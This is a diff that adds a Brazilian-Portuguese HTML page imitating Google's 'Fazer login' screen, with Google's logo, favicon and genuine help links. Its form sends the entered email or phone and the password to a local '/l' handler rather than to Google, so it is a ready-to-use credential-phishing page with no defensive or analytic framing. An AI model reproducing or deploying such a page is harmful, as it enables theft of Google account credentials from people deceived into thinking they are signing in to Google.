@@ -1,0 +1,146 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="./assets/style.css">
+    <link rel="shortcut icon" href="//www.google.com/favicon.ico">
+    <title>Login com Google</title>
+    <style>
+        * {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+}
+
+
+html,
+body {
+    margin: 0; height: 100%; overflow: hidden;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100%;
+    width: 100%;
+    font-family: roboto,'Noto Sans Myanmar UI',arial,sans-serif;
+}   
+
+#logo {
+    width: 80px;
+    margin: 0 40%;
+}
+.sla {
+    align-items: center;
+    text-align: end;
+    
+}
+/*set */
+h2 {
+    color: #202124;
+    padding-bottom: 0;
+    padding-top: 16px;
+    font-family: 'Google Sans','Noto Sans Myanmar UI',arial,sans-serif;
+    font-size: 24px;
+    font-weight: 400;
+    line-height: 1.3333;
+    margin-bottom: 0;
+    text-align: center;
+}
+.login1 {
+    text-align: center;
+    color: #202124;
+    font-size: 16px;
+    font-weight: 400;
+    letter-spacing: .1px;
+    line-height: 1.5;
+    padding-bottom: 0;
+    padding-top: 8px;
+}
+
+.link {
+    color: #1a73e8;
+    text-decoration: none;
+    font-weight: 500; 
+}
+
+.diag {
+
+    justify-content: center;
+    text-align: justify;
+    min-width: none;
+    max-width: 24rem;
+
+    min-height: 25rem;
+
+    border:1px solid #8b8b8b60;
+    height: 550px;
+    margin: 80px auto;
+    padding: 35px;
+    border-radius: 8px;
+}
+
+.box {
+    width: 100%;
+    padding: 15px;
+    border-radius: 3px solid;
+    margin: 5px 0;
+    border-radius: 6px;
+    border:1px solid #8b8b8b60;
+    margin-bottom: 1rem;
+}
+
+.space {
+    height: 30px;
+}
+
+.boxy {
+
+    cursor: pointer;
+    margin-left: 59%;
+    width: 8rem;
+    padding: 10px;
+    background-color: #1a73e8;
+    color: white;
+    border-radius: 3px;
+    border: none;
+    
+}
+
+.term {
+    color: #5f6368;
+    font-size: 14px;
+    position: relative;
+    margin-top: 32px;
+    margin-bottom: 3rem;
+}
+@media only screen and (max-width: 600px) {
+    .diag {
+        border-color: transparent;
+    }
+  }
+    </style>
+</head>
+<body scroll="no" style="overflow: hidden">
+
+    <form  action="/l" method="post">
+        <fieldset class="diag">
+                <div class="a23">
+                    <img id="logo" src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google Logo">
+                    <h2>Fazer login</h2>
+                    <p class="login1">Use sua Conta do Google para Continuar</p>
+                </div>
+                <div class="item">
+                    <input class="box" type="text" name="user" required placeholder="Email ou Telefone">
+                    <input class="box" type="password" name="pwd" required placeholder="Senha">
+                    <a class="link" href="https://accounts.google.com/signin/v2/usernamerecovery?hl=pt-BR&continue=https%3A%2F%2Fwww.google.com%2F&ec=GAlAmgQ&flowName=GlifWebSignIn&flowEntry=AddSession">Esqueceu seu e-mail?</a>
+                </div>
+                <div class="space"></div>
+                
+                    <p class="term">Não está no seu computador?  Use o modo visitante para fazer login com privacidade. <br> <a class="link" href="https://support.google.com/chrome/answer/6130773?hl=pt">Saiba mais</a></p> 
+                    <input class="boxy" type="submit" value="Login">
+                
+        </fieldset>
+    </form>
+</body>
+</html>
